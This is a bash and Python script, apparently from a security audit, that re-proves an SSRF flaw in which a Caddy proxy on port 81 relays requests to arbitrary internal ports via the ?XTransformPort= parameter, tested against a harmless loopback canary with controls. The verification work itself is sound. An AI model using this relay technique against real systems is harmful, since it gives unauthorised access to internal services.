#!/usr/bin/env bash
# ENV-1 live SSRF relay re-proof (follow-up Q5, 2026-10-23).
# Proves the LIVE root-owned Caddy on :81 still proxies to arbitrary
# internal ports via ?XTransformPort= — using a harmless canary that
# binds 127.0.0.1:8998 ONLY (loopback, never directly reachable).
set -uo pipefail

TOKEN="CANARY-ENV1-$(date +%H%M%S)"
PUBIP=$(ip -4 addr show eth0 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)

echo "### ENV-1 LIVE RE-PROOF — $(date -u '+%Y-%m-%d %H:%M:%SZ') ###"
echo "canary token          : $TOKEN"
echo "canary bind           : 127.0.0.1:8998 (loopback ONLY)"
echo "container public IP   : $PUBIP"
echo "live caddy            : :81 (root, PID 2, /app/Caddyfile mode 600)"
echo

python3 - "$TOKEN" "$PUBIP" <<'PY'
import http.server, socketserver, threading, urllib.request, sys, time
TOKEN, PUBIP = sys.argv[1], sys.argv[2]

class Canary(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        b = f"CANARY-HIT {TOKEN}".encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, *a): pass

srv = socketserver.TCPServer(("127.0.0.1", 8998), Canary)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.4)

def hit(label, url, expect_note):
    print(f"[{label}] GET {url}")
    print(f"           ({expect_note})")
    try:
        r = urllib.request.urlopen(url, timeout=6)
        body = r.read(120); code = r.getcode()
        got = TOKEN.encode() in body
        verdict = "*** CANARY REACHED — LIVE RELAY CONFIRMED (VULN) ***" if got else "reached something, but not the canary"
        print(f"    -> HTTP {code}  body={body[:64]!r}")
        print(f"    ==> {verdict}")
    except Exception as e:
        print(f"    -> {type(e).__name__}: {str(e)[:80]}")
        print("    ==> NOT reachable directly (expected for the no-relay control)")
    print()

print("--- CONTROL 1: canary directly via public IP, NO relay (must FAIL) ---")
hit("direct", f"http://{PUBIP}:8998/", "canary is loopback-only; without a relay this must be refused")

print("--- PROOF 1: via live :81 from loopback, relay to internal 8998 ---")
hit("relay-loopback", "http://127.0.0.1:81/?XTransformPort=8998", "asking Caddy :81 to relay to internal port 8998")

print("--- PROOF 2: via live :81 addressed to the PUBLIC interface (request still ORIGINATES INSIDE the container) ---")
hit("relay-public-if", f"http://{PUBIP}:81/?XTransformPort=8998", "same relay, but :81 addressed via the container public IP")

print("--- PROOF 3: lowercase parameter variant ---")
hit("relay-lowercase", "http://127.0.0.1:81/?xtransformport=8998", "case-insensitive match check")

print("--- PROOF 4: relay to a port with NO listener (control: parameter is honored per request) ---")
hit("relay-dead-port", "http://127.0.0.1:81/?XTransformPort=8997", "nothing listens on 8997; relay should error, not fall through")

srv.shutdown()
PY

echo "### END RE-PROOF ###"
